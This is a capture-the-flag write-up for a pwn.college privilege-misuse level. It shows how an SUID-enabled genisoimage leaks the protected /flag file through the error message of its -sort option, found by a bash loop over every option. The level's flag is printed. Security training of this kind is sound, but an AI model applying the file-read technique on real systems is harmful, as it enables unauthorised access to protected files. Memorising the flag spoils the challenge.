This problem is quite challenging. 

`genisoimage`

`genisoimage` is a command-line tool or program or utility in Linux to create ISO image. 

> [!NOTE]
> What is ISO image?
> 
> An ISO image is a file that contains an exact copy or archive of the contents of an optical disc, such as a CD, DVD, or Blu-ray disc. This allows to preserve the entire structure of the disc including files, directories, and metadata.

`genisoimage` is used to generate ISO images from files and directories on your system which can later be `burned`(means writing onto a disk) onto a CD, DVD or used as a virtual disk.

```bash
hacker@program-misuse-level-23:~$ cd /challenge/
hacker@program-misuse-level-23:/challenge$ ls
lbabysuid_level23
hacker@program-misuse-level-23:/challenge$ ./babysuid_level23 
Welcome to ./babysuid_level23!

This challenge is part of a series of programs that
force you to understand different archive formats.

I just set the SUID bit on /usr/bin/genisoimage.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level23) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/genisoimage!
hacker@program-misuse-level-23:/challenge$ genisoimage /flag
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Permission denied. File /flag is not readable - ignoring
image not written to a terminal.
Use -o - to force the output.
```

Here, if we run `genisoimage /flag` it says `permission denied. File /flag is not readable`. But that should not be the case, right? Aren't we set `SUID` set on `genisoimage` .

But actually what is happening is that the `genisoimage` is dropping the `SUID` before accessing the `flag` file. We can `strace genisoimage /flag` which displays the `system call` into your terminal. You will find this 

`getuid()                                = 1000
`setreuid(-1, 1000)                      = 0`

We have to look for other options. Look at the `man genisoimage`.

We can also look at the `genisoimage --help`. We have to look for something that take a `file`
So we run `genisoimage --help | grep File`. which will print lines that has string `file`. But we didn't see anything. Because the output is going to the `stderr`. We have to redirect it in the `stdout`. So the correct command will be `genisoimage --help 2>&1 | grep File`.


```bash
  -abstract FILE              Set Abstract filename
  -biblio FILE                Set Bibliographic filename
  -check-session FILE         Check all ISO9660 names from previous session
  -copyright FILE             Set Copyright filename
  -b FILE, -eltorito-boot FILE
  -e FILE, -efi-boot FILE     Set EFI boot image name
  -B FILES, -sparc-boot FILES Set sparc boot image names
  -sunx86-boot FILES          Set sunx86 boot image names
  -G FILE, -generic-boot FILE Set generic boot image name
  -c FILE, -eltorito-catalog FILE
  -hide GLOBFILE              Hide ISO9660/RR file
  -hide-list FILE             File with list of ISO9660/RR files to hide
  -hidden GLOBFILE            Set hidden attribute on ISO9660 file
  -hidden-list FILE           File with list of ISO9660 files with hidden attribute
  -hide-joliet GLOBFILE       Hide Joliet file
  -hide-joliet-list FILE      File with list of Joliet files to hide
  -i ADD_FILES                No longer supported
  -log-file LOG_FILE          Re-direct messages to LOG_FILE
  -m GLOBFILE, -exclude GLOBFILE
  -exclude-list FILE          File with list of file names to exclude
  -M FILE, -prev-session FILE Set path to previous session to merge
  -o FILE, -output FILE       Set output file name
  -path-list FILE             File with list of pathnames to process
  -alpha-boot FILE            Set alpha boot image name (relative to image root)
  -hppa-kernel-32 FILE        Set hppa 32-bit image name (relative to image root)
  -hppa-kernel-64 FILE        Set hppa 64-bit image name (relative to image root)
  -hppa-bootloader FILE       Set hppa boot loader file name (relative to image root)
  -hppa-ramdisk FILE          Set hppa ramdisk file name (relative to image root)
  -mips-boot FILE             Set mips boot image name (relative to image root)
  -mipsel-boot FILE           Set mipsel boot image name (relative to image root)
  -jigdo-jigdo FILE           Produce a jigdo .jigdo file as well as the .iso
  -jigdo-template FILE        Produce a jigdo .template file as well as the .iso
  -md5-list FILE              File containing MD5 sums of the files that should be checked
  -sort FILE                  Sort file content locations according to rules in FILE
  -stream-file-name FILE_NAME Set the stream file ISO9660 name (incl. version)
  -x FILE, -old-exclude FILE  Exclude file name(depreciated)
  -map MAPPING_FILE           Map file extensions to HFS TYPE/CREATOR
  -H MAPPING_FILE, -map MAPPING_FILE
  -magic FILE                 Magic file for HFS TYPE/CREATOR
  -boot-hfs-file FILE         Set HFS boot image name
  -auto FILE                  Set HFS AutoStart file name
  -hide-hfs GLOBFILE          Hide HFS file
  -hide-hfs-list FILE         List of HFS files to hide
  -root-info FILE             finderinfo for root folder
  -prep-boot FILE             PReP boot image file -- up to 4 are allowed
```

We can try some options. Lets try `genisoimage -path-list /flag`

```bash
hacker@program-misuse-level-23:/challenge$ genisoimage -path-list /flag
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Permission denied. Unable to open pathname list /flag.
```

But it also says `permission denied.`

Can we try all of them? There is not much of options here. We can try each separately. Or we can try all of them at once by `automating them`. Yes, we can do that with the help of some kind of `for loop` in `bash`.

if you run `genisoimage --help 2>&1 | grep FILE | awk '{print $1}'` . Here `awk` is a powerful programming language primarily used for `text processing`. you will find a `awk` related problem in the later section of this module.

Here `print $1` is printing the first column of each line before the space.

```bash
hacker@program-misuse-level-23:/challenge$ genisoimage --help 2>&1 | grep FILE | awk '{print $1}'
-abstract
-biblio
-check-session
-copyright
-b
-e
-B
-sunx86-boot
-G
-c
-hide
-hide-list
-hidden
-hidden-list
-hide-joliet
-hide-joliet-list
-i
-log-file
-m
-exclude-list
-M
-o
-path-list
-alpha-boot
-hppa-kernel-32
-hppa-kernel-64
-hppa-bootloader
-hppa-ramdisk
-mips-boot
-mipsel-boot
-jigdo-jigdo
-jigdo-template
-md5-list
-sort
-stream-file-name
-x
-map
-H
-magic
-boot-hfs-file
-auto
-hide-hfs
-hide-hfs-list
-root-info
-prep-boot
```

If you run `for option in $(genisoimage --help 2>&1 | grep FILE | awk '{print $1}'; do echo $option; done` it will print the same output.

Now if we add `genisoimage $option /flag`, that will automate the whole process.

```bash
hacker@program-misuse-level-23:/challenge$ for option in $(genisoimage --help 2>&1 | grep FILE | awk '{print $1}'); do echo $option; genisoimage $option /flag; done
-abstract
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-biblio
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-check-session
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Short read on old image
-copyright
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-b
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.

I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-B
genisoimage: Permission denied. Cannot access '/flag'.
-sunx86-boot
genisoimage: Permission denied. Cannot access '/flag'.
-G
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-c
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-hide
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-hide-list
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-hidden
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-hidden-list
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-hide-joliet
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-hide-joliet-list
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-i
genisoimage: -i option no longer supported.
-log-file
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-m
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-exclude-list
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-M
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Multisession usage bug: Must specify -C if -M is used.
-o
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-path-list
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Permission denied. Unable to open pathname list /flag.
-alpha-boot
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-hppa-kernel-32
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-hppa-kernel-64
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-hppa-bootloader
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-hppa-ramdisk
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-mips-boot
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-mipsel-boot
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-jigdo-jigdo
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-jigdo-template
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-md5-list
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-sort
genisoimage: Incorrect sort file format
        pwn.college{sxtkGqjuLOaCH85hmVukuJpaKds.0VN2EDL0AjNzQzW}
-stream-file-name
genisoimage: Illegal character '/' in stream-file-name.
-x
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-map
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Permission denied. unable to open mapping file
-H
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Permission denied. unable to open mapping file
-magic
I: -input-charset not specified, using utf-8 (detected in locale settings)
failed to open magic file: cannot read magic file `/flag' (Permission denied)
-boot-hfs-file
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Warning: no Apple/Unix files will be decoded/mapped
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-auto
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Warning: no Apple/Unix files will be decoded/mapped
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-hide-hfs
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Warning: no Apple/Unix files will be decoded/mapped
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-hide-hfs-list
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Warning: no Apple/Unix files will be decoded/mapped
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-root-info
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Warning: no Apple/Unix files will be decoded/mapped
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
-prep-boot
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
```


Here the `-sort` option is printing the `flag` file.
```bash
-sort
genisoimage: Incorrect sort file format
        pwn.college{sxtkGqjuLOaCH85hmVukuJpaKds.0VN2EDL0AjNzQzW}
-stream-file-name
genisoimage: Illegal character '/' in stream-file-name.
-x
I: -input-charset not specified, using utf-8 (detected in locale settings)
genisoimage: Missing pathspec.
Usage: genisoimage [options] -o file directory ...

Use genisoimage -help
to get a list of valid options.

Report problems to debburn-devel@lists.alioth.debian.org.
```

We can ease this also with :

```bash
hacker@program-misuse-level-23:/challenge$ for option in $(genisoimage --help 2>&1 | grep FILE | awk '{print $1}'); do echo $option; genisoimage $option /flag; done 2>&1 | grep pwn.college
        pwn.college{sxtkGqjuLOaCH85hmVukuJpaKds.0VN2EDL0AjNzQzW}
```

If you don't want to `echo` the option, just run the command you can do this:

```bash
hacker@program-misuse-level-23:/challenge$ for option in $(genisoimage --help 2>&1 | grep FILE | awk '{print $1}'); do genisoimage $option /flag; done 2>&1 | grep pwn.college
		pwn.college{sxtkGqjuLOaCH85hmVukuJpaKds.0VN2EDL0AjNzQzW}
```

